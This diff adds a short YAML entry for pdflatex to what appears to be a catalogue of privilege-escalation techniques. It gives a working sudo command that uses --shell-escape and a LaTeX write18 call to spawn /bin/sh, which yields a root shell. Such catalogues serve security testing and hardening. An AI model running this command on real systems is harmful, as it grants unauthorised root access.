@@ -1,0 +1,4 @@
+name: pdflatex
+binary_path: /usr/bin/pdflatex
+exploit_cmds:
+- sudo /usr/bin/pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
